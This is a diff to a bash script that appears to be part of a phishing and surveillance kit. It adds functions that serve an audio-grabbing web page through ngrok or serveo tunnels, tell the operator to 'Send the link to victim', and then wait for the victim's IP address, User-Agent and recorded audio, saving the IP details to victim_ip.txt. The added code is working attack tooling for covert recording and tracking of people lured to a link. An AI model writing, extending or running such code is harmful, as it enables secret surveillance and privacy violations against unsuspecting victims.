@@ -472,6 +472,145 @@ done
 
 }
 
+gaudiofile() {
+
+printf "\e[0m\n"
+printf "\e[0m\e[1;91m [\e[1;97m01\e[1;91m]\e[1;93m Ngrok\e[0m\n"
+printf "\e[0m\e[1;91m [\e[1;97m02\e[1;91m]\e[1;93m Serveo\e[0m\n"
+printf "\e[0m\n"
+gaudio_d_o_server="1"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' gaudio_option_server
+gaudio_option_server="${gaudio_option_server:-${gaudio_d_o_server}}"
+
+if [[ $gaudio_option_server == 1 || $gaudio_option_server == 01 ]]; then
+startngrok_audio
+elif [[ $gaudio_option_server == 2 || $gaudio_option_server == 02 ]]; then
+startserveo_audio
+
+else
+printf " \n\n\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
+gaudiopayload_ngrok() {
+
+gaudiongrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+server_link+'$gaudiongrok_link'+g' .server/audiofile/.app.js > .server/audiofile/app.js
+sed 's+server_link+'$gaudiongrok_link'+g' .server/audiofile/grabfile.php > .server/audiofile/index.php
+
+}
+gaudiopayload_serveo() {
+
+gaudioserveo_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
+sed 's+server_link+'$gaudioserveo_link'+g' .server/audiofile/.app.js > .server/audiofile/app.js
+sed 's+server_link+'$gaudioserveo_link'+g' .server/audiofile/grabfile.php > .server/audiofile/index.php
+
+}
+
+startngrok_audio() {
+
+if [[ -e .server/audiofile/ip.txt ]]; then
+rm -rf .server/audiofile/ip.txt
+
+fi
+if [[ -e .server/audiofile/audio.log ]]; then
+rm -rf .server/audiofile/audio.log
+
+fi
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\n"
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok...\e[0m\n"
+cd .server/audiofile && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
+sleep 2
+cd .server && ./ngrok http 5555 > /dev/null 2>&1 &
+sleep 5
+gaudiongroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $gaudiongroklink
+
+gaudiopayload_ngrok
+gaudiofound
+
+}
+
+startserveo_audio() {
+
+if [[ -e .server/audiofile/ip.txt ]]; then
+rm -rf .server/audiofile/ip.txt
+
+fi
+if [[ -e .server/audiofile/audio.log ]]; then
+rm -rf .server/audiofile/audio.log
+
+fi
+
+gaudiodef_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $gaudiodef_port
+read gaudioport
+gaudioport="${gaudioport:-${gaudiodef_port}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mhttp://127.0.0.1:$gaudioport\e[0m\e[1;92m)\e[0m\n"
+cd .server/audiofile && php -S 127.0.0.1:$gaudioport > /dev/null 2>&1 & 
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
+if [[ -e .grablink ]]; then
+rm -rf .grablink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$gaudioport' serveo.net 2> /dev/null > .grablink ' &
+printf "\n"
+sleep 5
+gaudio_send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
+printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $gaudio_send_url
+
+gaudiopayload_serveo
+gaudiofound
+}
+
+gaudiofound() {
+
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victim ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e ".server/audiofile/ip.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+printf "\e[0m\n"
+gaudioip=$(grep -a 'IP:' .server/audiofile/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+gaudioua=$(grep 'User-Agent:*' .server/audiofile/ip.txt | cut -d '"' -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP :\e[0m\e[1;96m %s\e[0m\n" $gaudioip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m %s\e[0m\n" $gaudioua
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m victim_ip.txt\e[0m\n"
+cat .server/audiofile/ip.txt >> victim_ip.txt
+rm -rf .server/audiofile/ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e ".server/audiofile/audio.log" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Image Received !!\n"
+rm -rf .server/audiofile/audio.log
+fi
+sleep 0.5
+
+done 
+
+}
+
 banner
 deps
 menu
